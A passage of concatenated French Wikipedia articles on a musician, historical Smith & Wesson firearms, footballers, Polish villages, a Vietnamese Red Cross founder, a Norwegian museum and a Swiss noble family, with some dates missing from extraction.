Il fait partie des pionniers de la musique électronique en France au début des années 80.
Biographie.
Influencé par la musique électronique et expérimentale des années 50 et 60, celle de Pierre Henry ou Pierre Schaeffer principalement, et des années 70, celle du groupe allemand Kraftwerk , au niveau du son, ainsi que par la musique du début du avec Béla Bartók, Erik Satie ou encore Claude Debussy pour les compositions, Philippe Laurent commence à enregistrer ses premières cassettes vers 1979. Il sort quelques cassettes dans les années 80 sur des petits labels underground et participe à de nombreuses compilations autant en France qu'à l'étranger.
Au début des années 90, sa musique se fait moins électronique et plus contemporaine, avec le double disque "Faste Occidental" sorti en 1993 qu'il joue sur scène à l'Élysée-Montmartre en . Mais sa musique, plus complexe, exigeante et référencée, a du mal à trouver son public à ce moment-là.
Il revient sur le devant de la scène grâce au renouveau de la musique électronique minimale dans les années 2000, et surtout grâce à la sortie du disque compilation "Hot Bip" sur le label américain Minimal Wave en 2011. Depuis, il s'est remis à faire des concerts en France et à l'étranger, reprenant comme base ses morceaux des années 80, retravaillés et remixés.

</doc>
<doc id="8733033" url="https://fr.wikipedia.org/wiki?curid=8733033" title="Smith &amp; Wesson Safety Hammerless">
Smith &amp; Wesson Safety Hammerless

Le Smith &amp; Wesson (S &amp; W) Safety Hammerless ou Smith &amp; Wesson New Departure (surnommé familièrement le presse-citron) est un révolver à barillet à double action fabriqué en deux tailles de 1887 à 1940 à plus de 500 000 exemplaires.
Le revolver à sûreté et à chien interne complète et succède à la gamme de révolvers de même calibres de type "new modele three", et influence la création du Smith &amp; Wesson modèle n°4.
Particularités.
Comme l'indique son nom, ce modèle de revolver possède un dispositif de sûreté ("safety") et pas de chien apparent ("hammerless"). Ils sont les derniers de la série à canon brisé et viennent avant la série "Hand ejector" avec barillet "swing out".
Sûreté.
La sûreté qui bloque la gâchette est verrouillée et déverrouillée avec un bouton-pressoir situé à l'arrière sur toute la hauteur du manche, ce qui lui a valu le surnom de "presse citron". La poignée de sûreté a été réutilisée à partir de 1952 pour les Smith &amp; Wesson modèles 40 et 52.
Chien interne.
Il n'y a pas de chien à l'extérieur : le marteau et le mécanisme de la percussion sont cachés dans un carter situé en haut du manche, comme pour les carabines Winchester. Cette disposition présente l'avantage de ne pas permettre un accrochage involontaire dans la poche ou ailleurs ; il place les mécanismes à l'abri des poussières, des fumées et donc de l'oxydation. Il a l'inconvénient de ne pas permettre de procéder manuellement au réarmement et de compliquer le démontage.
Canon brisé.
L'éjection et le rechargement des balles sont plus rapides, le barillet a moins tendance à prendre du jeu ou à faire des erreurs d'indexation.
Percussion.
Ces revolvers étaient très avancés parce qu'ils possèdent un percuteur à inertie, développé par Joe Wesson, fils de Daniel B. Wesson. Il est monté dans l'armature et à ressort ; il pouvait frapper l'amorce seulement lorsqu’il recevait un coup suffisant du chien, qui transférait l'élan à partir du chien à la tige de percuteur elle-même. Quand le chien caché était au repos contre la tige du percuteur, celle-ci ne dépassait pas de l'armature.
Présentation.
C'est un révolver à barillet à brisure. Le barillet est verrouillé.
Il est fabriqué en acier avec une finition noir acier bleui ou nickelé, mais le pontet et la gâchette sont toujours noir bleui.
Les plaquettes de crosse sont en gutta-percha puis en ébonite, et portent un macaron avec S&amp;W en général noir, parfois marron foncé. On en trouve aussi en nacre.
Le marquage se trouve sur le dessus du canon, et assez rarement, sur commande spéciale, à droite du canon avec la mention Made in USA. Pour le calibre 32 un logo S&amp;W est toujours gravé sur le côté gauche de la platine, mais pas sur le calibre 38.
Fabrication.
Le calibre 38 utilise la carcasse 2 du S&amp;W, tandis que la calibre 32 utilise une carcasse 1 1/2.
La conception du premier modèle .38 a été achevée le . Cette version avait quelques défauts qui pouvaient occasionner des tirs accidentels.
Calibre .38.
Le S&amp;W .38 Safety Hammerless a été produit en huit exemplaires nickelés en , et vingt autres, aussi nickelés, en . La commercialisation s'est faite de 1887 à 1940 en cinq versions et vendu à 261 493 exemplaires.
Il a été fabriqué en cinq versions, qui diffèrent essentiellement par leur système de verrouillage :
Calibre .32.
Le S&amp;W .32 Safety Hammerless a été produit dès (avec 6 premiers exemplaires nickelés) à 1937, et vendu à 242 981 exemplaires. Le premier modèle du .32 correspond au troisième modèle du .38.
Il a été fabriqué en trois versions :
Imitations.
Ce modèle avec sa sûreté et son chien interne, a été repris par des fabricants américains qui ont commercialisé des versions courantes beaucoup moins chères, comme , Harrington &amp; Richardson, American Arms co Boston. Ces imitations moins chères et de moins bonne qualité car destinées à un usage occasionnel, étaient destinées à un public, les particuliers qui voulaient une arme de défense contre une agression ; produites en petit calibre, elles sont parfois nommées par dérision Saturday night special 32, ou Suicide special 32.
Le Safety Hammerless a aussi été copié pour faire quelques versions très luxueuses, comme celles de la firme Spencer dans le Connecticut (le "Spencer safety hammeless pat. jan. 24 1888").
Il y a eu aussi eu de nombreuses imitations fabriquées en Espagne et en Belgique et commercialisées sous des marques fantaisies.
Variantes &amp; versions.
Le Smith &amp; Wesson à sûreté et à chien interne est décliné en deux calibres : 0.38 et 0.32 qui ont des carcasses différentes.
Calibre .38.
On le trouve avec un canon de 2 pouces (4,4 cm), de 3 pouces (5,1 cm), de 3,5 pouces (8,9 cm), de 5 pouces (12.7 cm) et même des exemplaires très rares avec un barillet de 6 pouces (15,2 cm).
Sa longueur minimale est de 19 cm. Le canon mesure 8,3 cm, 10,2 cm, 15 cm ou 16,5 cm.
Calibre .32.
Sa longueur minimale est de 15 cm, 17,7 cm. Le canon mesure 5,1 cm, 7,6 cm ou 8,9 cm.
Une version de 15 cm avec un canon de 2 pouces qui pèse 380 grammes a été commercialisée à partir de 1898 pour permettre aux cyclistes de se défendre contre les attaques de chiens.
Le S&amp;W .32 Safety Hammerless a donné lieu à de nombreuses imitations économiques commercialisées auprès des particuliers comme armes de défense occasionnelle ; ils sont appelés "suicide special" ou "saturday night special".
Smith &amp; Wesson Modèle n°4.
Il ressemble beaucoup au Safety Hammerless dont il a les mêmes caractéristiques.
Munitions.
Balles à poudre noire .38 Smith &amp; Wesson et .32 Smith &amp; Wesson qui ne sont plus fabriquées par la firme, mais qui restent fabriquées industriellement dans certains pays (Autriche, Brésil, Italie, États-Unis) pour ceux qui pratiquent le tir de loisir.

</doc>
<doc id="8733049" url="https://fr.wikipedia.org/wiki?curid=8733049" title="Gilles Salou">
Gilles Salou

Gilles Salou, né le à Paris, est un footballeur et entraîneur français. 
Biographie.
Salou commence sa carrière professionnelle avec le RC Franc-Comtois, qui deviendra plus tard le Racing Besançon. Intégrant l'effectif professionnel durant la saison 1981-1982, il devient un titulaire important pendant quatre saisons. Après une année en première division, avec le SC Toulon-Var, il dépasse les frontières pour jouer en Suisse, avec le Vevey-Sports, évoluant en deuxième division suisse. 
Il revient en France au sein du Football Club de Martigues, en 1988, et y reste pendant deux saisons. Salou a l'occasion d'évoluer deux ans sous le maillot du Sporting Club de Bastia, mais n'a pu prolonger comme prévu son aventure au sein du club Corse, à la suite de la catastrophe de Furiani du qui a gelé toute possibilité de prolongation de contrat. Il fait donc une saison au sein de l'AS Nancy-Lorraine, puis le défenseur se met en retrait du monde professionnel. Il dispute une année avec l'AS Lyon-Duchère, en National 1 (troisième division française) avant de devenir entraîneur-joueur de l'USC Corte, en Corse.
Après une année comme entraîneur adjoint et joueur au FC Rouen aux côtés de ami Laurent Roussey, il termine sa carrière de footballeur à l'US Cluses-Scionzier en 1998. Salou continue, cependant, à assumer son poste d'entraîneur jusqu'en 2001. En 2002, il prend en main l'équipe du RCS La Chapelle, en CFA, et fait deux saisons sur le banc. 
Salou va ensuite devenir responsable du Pôle espoirs (FFF) d'Aix-en-Provence, puis de celui de Dijon pendant près de 10 ans. 
En 2014, il est nommé directeur du centre de formation de l'Évian Thonon Gaillard FC et entraîneur de l'équipe réserve.
En 2017, il assure le remplacement de la direction du centre de formation des Féminines de l'Olympique Lyonnais.
A la tête des U17 Nationaux du Nîmes Olympique de 2018 à 2021, il est dorénavant entraîneur assistant de l'équipe réserve de l'ESTAC (National 3).

</doc>
<doc id="8733050" url="https://fr.wikipedia.org/wiki?curid=8733050" title="Édouard-Alexandre Bernard">
Édouard-Alexandre Bernard

Édouard-Alexandre Bernard dit aussi Édouard Bernard, né le à Saint-Lubin-des-Joncherets (Eure-et-Loir) et mort le en Seine-et-Marne, est un artiste peintre, affichiste, caricaturiste, graveur et dessinateur français.
Biographie.
Édouard Bernard commence à produire des affiches dès 1901, travaillant avec le lithographe-imprimeur Bataille (Paris) ; il fut un affichiste fécond jusque dans les années 1930. Caricaturiste plein d'esprit, il expose au Salon des humoristes entre 1907 et 1910 et collabore à des périodiques tels que "L'Assiette au beurre" (coordonnant les en 1906 et en 1907), "L'Humoriste", "Le Sourire", "Fantasio", "Le Rire", ou encore "L'Amour", une revue leste diffusée par abonnement.
Dès avant 1914, il illustre en effet de nombreux ouvrages érotiques qu'il signe de divers pseudonymes dont « G. Whip » et « W. Floger », exercice qu'il poursuit après 1918. Ses illustrations très soignées seront reprises et réimprimées dans des rééditions « sous le manteau » jusque dans les années 1950 et frappées d'interdiction. Bernard exécuta également quelques recueils de cartes postales illustrées ainsi que des albums sur le cabaret dansant.
Son atelier parisien après la Première Guerre mondiale se trouvait au 44 rue de Lancry.
Œuvre.
Ouvrages illustrés.
Sans date :
&lt;br&gt;
La plupart des auteurs publient ici sous pseudonyme :

</doc>
<doc id="8733068" url="https://fr.wikipedia.org/wiki?curid=8733068" title="Moszna-Wieś">
Moszna-Wieś

Moszna-Wieś (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de 228 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8733080" url="https://fr.wikipedia.org/wiki?curid=8733080" title="Otrębusy">
Otrębusy

Otrębusy (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de 2 441 habitants en 2013.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8733091" url="https://fr.wikipedia.org/wiki?curid=8733091" title="Owczarnia (Mazovie)">
Owczarnia (Mazovie)

Owczarnia (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres au sud de Brwinów (siège de la "gmina"), au sud-ouest de Pruszków (siège du "powiat") et à au sud-ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8733095" url="https://fr.wikipedia.org/wiki?curid=8733095" title="Pluralité des mondes">
Pluralité des mondes



</doc>
<doc id="8733099" url="https://fr.wikipedia.org/wiki?curid=8733099" title="Owczarnia">
Owczarnia

En Pologne, Owczarnia peut désigner :

</doc>
<doc id="8733101" url="https://fr.wikipedia.org/wiki?curid=8733101" title="Wert">
Wert



</doc>
<doc id="8733110" url="https://fr.wikipedia.org/wiki?curid=8733110" title="Francisco Roldán Jiménez">
Francisco Roldán Jiménez

Francisco Roldán Jiménez (Moguer, -Mer des Caraïbes, ) est un administrateur colonial espagnol.
Biographie.
Chevalier des Rois catholiques, il participe en 1492 à la conquête de Grenade. Il accompagne ensuite Christophe Colomb comme intendant lors de son deuxième voyage. Gagnant la confiance de Colomb, celui-ci le nomme alors Maire de La Isabela.
Colomb rentrant en Europe et laissant l'île aux mains de son frère Bartolomeo, il s'autoproclame alcade de Saint-Domingue puis tente d'abandonner les établissements coloniaux de l'île (1497). Il échoue devant la riposte des frères Colomb (1499).
Roldán essaie de provoquer une nouvelle révolte qui grâce à l'appui de Bobadilla, chasse les Colomb qui sont renvoyés en Europe.
Il meurt en mer en 1502 dans le même ouragan qui coûte la vie à Bobadilla.

</doc>
<doc id="8733112" url="https://fr.wikipedia.org/wiki?curid=8733112" title="Philippe Laurent">
Philippe Laurent

Philippe Laurent peut désigner :

</doc>
<doc id="8733117" url="https://fr.wikipedia.org/wiki?curid=8733117" title="Parzniew">
Parzniew

Parzniew (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres à l'est de Brwinów (siège de la "gmina"), 3 kilomètres au sud-ouest de Pruszków (siège du "powiat") et à 18 kilomètres au sud-ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de 1 497 habitants en 2012.
Histoire.
Au cours de la Seconde Guerre mondiale, durant la guerre défensive polonaise, le , environ 100 prisonniers de guerre polonais ont été massacrés à Parzniew par les troupes allemandes de la Wehrmacht.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8733118" url="https://fr.wikipedia.org/wiki?curid=8733118" title="Saturne chaud">
Saturne chaud

Le nom de Saturne chaud peut désigner :

</doc>
<doc id="8733121" url="https://fr.wikipedia.org/wiki?curid=8733121" title="Popówek (Mazovie)">
Popówek (Mazovie)

Popówek (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8733127" url="https://fr.wikipedia.org/wiki?curid=8733127" title="Popówek">
Popówek

En Pologne, Popówek peut désigner :

</doc>
<doc id="8733132" url="https://fr.wikipedia.org/wiki?curid=8733132" title="Terenia">
Terenia

Terenia (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres au sud de Brwinów (siège de la "gmina"), 9 kilomètres au sud-ouest de Pruszków (siège du "powiat") et à au sud-ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8733135" url="https://fr.wikipedia.org/wiki?curid=8733135" title="Muséum d'histoire naturelle et d'archéologie de Trondheim">
Muséum d'histoire naturelle et d'archéologie de Trondheim

Le muséum d'histoire naturelle et d'archéologie (NTNU), (en norvégien : "Vitenskapsmuseet"), est un musée dépendant de l'université norvégienne de sciences et de technologie (NTNU : "Norges teknisk-naturvitenskapelige universitet") situé à Trondheim en Norvège. 
Historique.
Les collections du muséum d'histoire naturelle et d'archéologie furent constituées en 1767 quand la Société royale des lettres et des sciences de Norvège les a officiellement constituées et organisées. Ces collections enrichies avec les siècles furent regroupées pour l'ouverture officielle du muséum en 1926. En 1968, le muséum fut rattaché à l'université de Trondheim.
Le muséum présente trois thèmes historiques concernant spécifiquement la région de Trondheim et plus largement la région septentrionale de la Scandinavie : l'histoire naturelle, l'histoire culturelle et l'archéologie.
Le département d'archéologie présente des objets datant de l'âge de pierre, de l'âge du bronze, de l'âge du fer et de la période vikings. L'histoire médiévale de Trondheim est également abordée. 
L'histoire culturelle relate l'histoire et la culture du peuple autochtone des Samis ou Lapons. 
L'histoire naturelle présente une collection d'oiseaux, poissons, mammifères et insectes d'Europe du Nord.
Un jardin botanique ouvert au public complète les collections du muséum de Trondheim. 
Le NTNU gère également une station biologique située à Kongsvoll et le jardin botanique de Kongsvoll depuis .

</doc>
<doc id="8733142" url="https://fr.wikipedia.org/wiki?curid=8733142" title="Żółwin (Mazovie)">
Żółwin (Mazovie)

Żółwin (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres au sud de Brwinów (siège de la "gmina"), 9 kilomètres au sud-ouest de Pruszków (siège du "powiat") et à au sud-ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8733144" url="https://fr.wikipedia.org/wiki?curid=8733144" title="Schéma de la ligne de Lens à Don - Sainghin">
Schéma de la ligne de Lens à Don - Sainghin



</doc>
<doc id="8733145" url="https://fr.wikipedia.org/wiki?curid=8733145" title="Żółwin">
Żółwin

Żółwin peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8733165" url="https://fr.wikipedia.org/wiki?curid=8733165" title="Hồ Văn Nhựt">
Hồ Văn Nhựt

Hồ Văn Nhựt (15 July 1905 – 13 March 1986) est un médecin qui a fondé la branche sud de la Croix-Rouge vietnamienne () et un leader de l'opposition Sud-Vietnamien pendant et après la période de résistance contre le colonialisme.
Enfance et éducation.
Hồ Văn Nhựt est né le au village de Tân Qui Đông, province de Sa Đéc, dans une famille traditionnelle de lettrés et mandarins. Son lieu de naissance se trouve dans la partie méridionale du Vietnam qui était alors une colonie française connue sous le nom de Cochinchine française.
Il obtient la permission de son père pour se rendre à Saïgon étudier au Collège Chasseloup-Laubat dans la section “indigène”, réservée aux enfants vietnamiens. L'érudit et historien compte parmi ses camarades. Quelque temps plus tard, lorsqu’il est encore un adolescent, Nhựt voyage en France pour poursuivre ses études. Le but de ces études est de lui permettre d’acquérir le savoir occidental nécessaire pour servir son pays à son retour au Vietnam.
Études médicales et retour au Vietnam.
Après l'obtention de son brevet et baccalauréat à Montpellier, Hồ Văn Nhựt entreprend sa formation médicale dans cette ville, puis “monte” à Paris pour achever ses études de médecine. Il reçoit son diplôme de Docteur en médecine de la Faculté de médecine de Paris en 1933. Sa thèse dirigée par le professeur Louis-Jacques Tanon (1876–1969), un éminent expert en hygiène et médecine tropicale, est consacrée à l'étude du paludisme et les approches pour contrôler cette maladie à Saïgon.
 Nhựt choisit alors de se spécialiser en gynécologie obstétrique sous la direction du professeur Alexandre Couvelaire (1873–1948), un spécialiste de premier plan dans ce domaine, à la Maternité Baudelocque, Hôpital Cochin (fusionnée maintenant avec la Maternité Port-Royal). Il pratique la médecine en France pour un certain temps pour acquérir davantage d'expérience avant de retourner au Vietnam en 1938 où il fonde la première maternité au Sud du Vietnam dans la banlieue Saïgonnaise de . Nhựt, par la suite, devient directeur de la Maternité nationale Từ Dũ () à Saïgon.
En dehors de sa carrière professionnelle, le Nhựt participe au mouvement national pour populariser la presse écrite en Vietnamien moderne, ou Quốc ngữ, en Cochinchine. Avec son ami et collègue, le , il fonde le journal hebdomadaire Văn Lang à Saïgon en 1939 qui reçoit le soutien et les contributions des intellectuels sud-vietnamiens formés en France.
Actes humanitaires et œuvre pour la Croix Rouge.
On se souvient de l'œuvre humanitaire de Hồ Văn Nhựt à travers le soutien qu'il apporte à ceux en difficulté pendant l'une des périodes les plus troublées de l'histoire du Vietnam. Il est personnellement impliqué dans l'aide à ses compatriotes qui sont persécutés à cause de leurs activités anticoloniales et, à titre d'exemple, a pris secrètement soin de la femme et des enfants du révolutionnaire Nguyen An Ninh après l'arrestation de Ninh par les autorités coloniales conduisant à sa mort en prison . Dans un contexte plus large, les efforts humanitaires du Dr Nhựt se manifestent à travers son œuvre pour la Croix-Rouge.
En 1951, Hồ Văn Nhựt établit l’organisation de la Croix-Rouge au Sud du Vietnam, qui est une organisation reconnue officiellement par le Comité international de la Croix-Rouge, pour répondre aux besoins croissants d'assistance aux civils pris dans le conflit pendant la guerre d'Indochine et aux victimes des catastrophes naturelles. L'organisation porte le nom officiel de Croix Rouge Vietnamienne (CRV), avec son siège sur une avenue dans le centre de Saïgon nommée d'après l'organisation (Hồng Thập Tự ou Croix Rouge en vietnamien; actuellement Nguyễn Thị Minh Khai).
Pendant son temps à la tête de la CRV, Nhựt, avec l'aide de ses amis, lève des fonds pour construire le siège de la CRV. Parmi beaucoup d'autres projets, il crée la première école d'infirmières, lance les premières classes de secouristes, et établit les premiers centres de soins médicaux communautaires du Sud-Vietnam. Dès , 15 médecins travaillent en rotation bénévolement dans les deux premiers centres de soins créés qui sont ouverts tous les jours de la semaine pour fournir des soins à 600 patients quotidiennement. Dans la même année, la CRV réussit à organiser neuf convois de secours, dont sept convois routiers et deux convois aériens, offrant de l'aide à 50.000 personnes à travers le Sud du Vietnam. Chaque convoi routier transporte autour de 100 membres de l’organisation, y compris 45 infirmières et 30 sauveteurs; les convois aériens sont moins chargés et sont rendus possibles grâce à l'aide de M. Phạm Hòe, directeur général de , la première compagnie aérienne privée du Vietnam.
La CRV a joué un rôle important dans le programme d'aide humanitaire au million de réfugiés quittant le Nord-Vietnam pour s'installer dans le Sud, à la suite des accords de Genève en 1954.
Le Hồ Văn Nhựt est nommé Chevalier de l'Ordre National du Vietnam () pour sa contribution et son dévouement à la CRV.
Leader de l’opposition sud-vietnamien.
 Hồ Văn Nhut est un leader de l'opposition sud-vietnamien connu pour sa réticence à coopérer avec les régimes sous influence étrangère. Il est invité à participer ou à former son propre gouvernement au sein des régimes successifs du Sud-Vietnam, mais a refusé de le faire pendant ou après l'administration française en Indochine. C'est ainsi qu'un un éminent historien et écrivain vietnamien se souvient de lui, "Comme d’ autres prominents patriotes sud-vietnamiens tels que , Dương Minh Thới, Phạm Văn Lạng, Thượng Công Thuận, Nguyễn Xuân Bai, le docteur était toujours prêt à participer à des mouvements nationalistes demandant la paix et l'indépendance" pour son pays.
En 1945, il est membre du comité central et chef de la propagande du mouvement de Jeunesse d'Avant-Garde () une importante coalition patriotique et humanitaire sud-vietnamienne qui, plus tard, joint le Việt Minh et s'embarque à la révolution d'Août contre le colonialisme.
En 1947, à l'appui de l'appel lancé par le Gouvernement Vietnamien de Résistance à la France, il signe volontairement le "Manifeste des Intellectuels de Saïgon-Cholon" appelant le gouvernement français à entamer les négociations afin de mettre fin au conflit dévastateur en Indochine. Les signataires du Manifeste estiment que le Vietnam est un pays avec une longue histoire qui mérite ses droits à la liberté et à l'indépendance, et qu’un conflit prolongé serait préjudiciable à la bonne relation entre la France et le Vietnam.
Plusieurs fois, il a refusé d'avoir une audience avec l’ex-empereur Bao Dai pour discuter de sa participation au gouvernement. Au début des années 1950, alors qu’il est président de la Croix Rouge Vietnamienne (CRV), le Nhựt a effacé le slogan "A bas le Việt Minh" peint au-dessus de la porte d'entrée de la CRV aux ordres de Bảo Đại, alors Chef de l'État du Vietnam.
Après les Accords de Genève et la partition du Vietnam en 1954, il est proposé comme candidat pour le poste de Premier ministre de l’État du Vietnam mais cette proposition ne s’est pas matérialisée. Par la suite, sous la Première République du Sud-Vietnam le Nhựt est invité à participer au gouvernement dirigé par Ngô Đình Diệm. Ngô Đình Nhu, frère et conseiller principal en matière de politiques de Diệm, l’invite à plusieurs réunions qui aboutissent à son refus de participer au gouvernement de Diệm à cause de leurs divergences politiques.
À la fin des années 1950 et au début des années 1960, ses activités patriotiques ont conduit à ses nombreux emprisonnements, notamment par Ngô Đình Diệm, et aussi à l'arrestation de sa femme.
En 1964, après l’effondrement de la Première République du Sud-Vietnam, le Nhựt est invité à participer au Haut Conseil National (), un organe consultatif civil mis en place par la junte militaire sous pression des États-Unis. Le Haut Conseil a pour but de rédiger la constitution de la Deuxième République. est nommé chef d’État par le Conseil et il demande alors au docteur Nhựt d'assumer le rôle de Premier ministre. Celui-ci refuse l'offre, mais est conséquemment persuadé de la reconsidérer. Il désire néanmoins négocier une solution pouvant amener à une réconciliation nationale et finalement renonce au poste de Premier ministre après des pourparlers peu satisfaisants.
Au cours de ses dernières années à Saïgon, le Nhựt consacre son temps à ses patients et à ceux qui ont besoin de son aide jusqu'à la fin de la guerre du Vietnam. Le docteur et sa femme sont réunis avec leur famille à l'étranger dans les dernières années de sa vie.
Le Hồ Văn Nhựt décède dans le le .
Notes.
Cet article est partiellement issu des articles de Wikipédia en anglais et vietnamien intitulés " ". Il est complété à l'appui d'autres biographies en langue anglaise et vietnamienne citées en références 

</doc>
<doc id="8733183" url="https://fr.wikipedia.org/wiki?curid=8733183" title="Liégeoise">
Liégeoise



</doc>
<doc id="8733192" url="https://fr.wikipedia.org/wiki?curid=8733192" title="Mercedes-Benz SL">
Mercedes-Benz SL



</doc>
<doc id="8733207" url="https://fr.wikipedia.org/wiki?curid=8733207" title="Liste de prix littéraires gastronomiques et culinaires">
Liste de prix littéraires gastronomiques et culinaires

Les Prix littéraires gastronomiques et culinaires sont des récompenses françaises décernées dans le domaine des arts culinaires et arts de la table.
Fonctionnement.
Ces différents titres récompensent chacun à leur manière le meilleur ouvrage littéraire soulignant les savoir-faire gastronomiques et la culture alimentaire.

</doc>
<doc id="8733225" url="https://fr.wikipedia.org/wiki?curid=8733225" title="Famille de Chexbres">
Famille de Chexbres

La famille de Chexbres est une ancienne famille de ministériaux du Pays de Vaud. La famille détient l'office de la mayorie ou mairie de Chexbres. Après l'extinction de la famille au , la mayorie revient à Hugues de Palézieux, qui a épousé la fille du dernier mayor de la famille.
Histoire.
Premiers membres.
Le premier membre cité de la famille est le mayor Pierre de Chexbres dans la moitié du , sous l'épiscopat de Guy de Maligny. Entre 1138 et 1143, il donne des biens qu'il tient de Guillaume de Glâne à l'abbaye d'Hauterive.
Son successeur, sous l'épiscopat de Landri de Durnes est son fils Raymond, que Martignier et de Crousaz considèrent comme la tige de la famille. Un de ses fils, Guillelmus, est moine à l'abbaye d'Hauterive. Raymond a deux autres fils et une fille, Pierre, Bouchard et Jacoma. Entre 1163 et 1177, Raymond donne dix poses de son alleu à l'abbaye d'Hauterive. Il donne un champ à la même abbaye en 1180.
Bouchard (ou Bourcard) succède à son père Raymond sous l'épiscopat de Roger de Vico Pisano (1174-1212). Il est mayor de 1184 à 1232. Un de ses fils, Jacobus, est moine à l'abbaye d'Hauterive. En 1223, il renonce avec son fils Anselme à toutes ses prétentions sur les bien de l'abbaye d'Hauterive dans la paroisse de Saint-Saphorin. Il porte le titre de chevalier en 1187 et 1209.
Anselme, fils de Bouchard, est vivant de 1221 à 1248.
Willermus, autre fils de Bouchard.
Castelnuovo qualifie la famille de « lignage [...] puissant dans Lavaux, mais qui se situe en marge de l'élite sociale du Pays de Vaud, à cheval entre un groupe de fonctionnaires [...] et un groupe aristocratique [...] ». Selon Morerod, ils se distinguent des autres ministériaux de la région. Pour lui, le fait qu'ils fassent entrer deux des leurs à l'abbaye d'Hauterive implique « une certaine prospérité et une influence régionale. »
Les membres de la famille portaient le titre de "maior" ou de "villicus". "Maior" est francisé en « mayor », « major » ou « maire » suivant les auteurs.
Étendue et siège de la mayorie.
Selon les auteurs, il existe une, deux ou trois mayories dans la paroisse de Saint-Saphorin.
Pour Godet, Türler et Attinger, il existe 3 mayories : Chexbres, Saint-Saphorin et Puidoux. Pour Éric Muller, il existe à l'origine trois mayories, mais celle de Puidoux est réunie plus tard à celle de Saint-Saphorin. La version d'Eric Muller est notamment reprise dans le dictionnaire historique de la Suisse à l'article « Puidoux ».
Pour Martignier et Crousaz, il existait deux mayories : celle de Chexbres et une autre mayorie, dite de Puidoux ou de Saint-Saphorin, qui s'étendait sur toute la paroisse sauf Chexbres et qui aurait été inféodée à Hugues de Palézieux en 1271 avec le château de Glérolles.
Morerod affirme dans le Dictionnaire historique de la Suisse que la mayorie de Chexbres s'étend sur toute la paroisse de Saint-Saphorin.
Pour Martignier et Crousaz, les mayors habitent au château de la Mottaz à Chexbres, tandis que pour Morerod ils habitent au château de Glérolles.
Liens avec les métraux de Chexbres.
Selon Martignier et Crousaz (1867), les mayors et les métraux de Chexbres seraient de la même famille. Les mayors seraient la branche aînée, tandis que les métraux, dont descend la famille de Crousaz, serait la branche cadette.
Selon Godet, Türler et Attinger (1921), aucun document ne permet d'appuyer cette hypothèse.
La fin de la dynastie.
La mayorie de Chexbres passe à Hugues de Palézieux, époux de Jacobette, la fille du mayor Anselme de Chexbres.

</doc>
<doc id="8733243" url="https://fr.wikipedia.org/wiki?curid=8733243" title="Dhurgham Ismail">
Dhurgham Ismail

Dhurgham Ismail est un footballeur international irakien, né le à Bagdad. Il évolue au poste d'arrière gauche au sein du club d'Al-Khaldiya SC.
Palmarès.
En club.
Avec Al Shorta Bagdad :

</doc>
<doc id="8733250" url="https://fr.wikipedia.org/wiki?curid=8733250" title="Smith &amp; Wesson 3000">
Smith &amp; Wesson 3000

Le fusil à pompe S&amp;W model 3000 fut produit par la firme américaine Smith &amp; Wesson au début des années 1980 pour succéder au Smith &amp; Wesson 916. S&amp;W a ensuite vendu ses droits à la société Mossberg et ce FAP devint le Mossberg 3000.
Description.
Ce fusil à pompe est de type classique. Son aspect extérieur est proche du Remington 870 mais son pontet est plus épais. Il est équipé d'un percuteur interne et d'un magasin tubulaire. C'est l'élévateur qui verrouille la culasse en prenant appui sur la carcasse. La fenêtre d'éjection est à droite du boîtier de carcasse tandis que le fond de ce dernier comprend la portière d'alimentation. La monture est en noyer américain mais la version Police est équipée d'une poignée pistolet et d'une crosse repliable latéralement.
Fiche techniques.
« Version Chasse »
« Version Police »

</doc>
<doc id="8733262" url="https://fr.wikipedia.org/wiki?curid=8733262" title="Tour des Finances de Liège">
Tour des Finances de Liège



</doc>
<doc id="8733281" url="https://fr.wikipedia.org/wiki?curid=8733281" title="Victor Bendix">
Victor Bendix

Victor Emmanuel Bendix, né le à Copenhague et mort le dans cette même ville, est un pianiste, chef d'orchestre et compositeur danois.
Biographie.
Victor Emmanuel Bendix fait ses études à l'Académie royale danoise de musique auprès de Niels Wilhelm Gade ainsi qu'avec Johann Peter Emilius Hartmann. Il étudie aussi auprès de Franz Liszt à Weimar. À son retour au Danemark, il devient professeur à l'Académie royale danoise de musique. En 1897, il organise les Concerts philharmoniques de Copenhague qu'il dirige pendant plusieurs années. On lui doit quatre symphonies, un concerto pour piano et de la musique chorale.

</doc>
<doc id="8733305" url="https://fr.wikipedia.org/wiki?curid=8733305" title="Mehdi Naghmi">
Mehdi Naghmi

Mehdi Neghmi, né le à Kasba Tadla (Maroc) est un footballeur marocain évoluant dans le club du Mouloudia Club d'Oujda. Il joue au poste d'attaquant.
Palmarès.
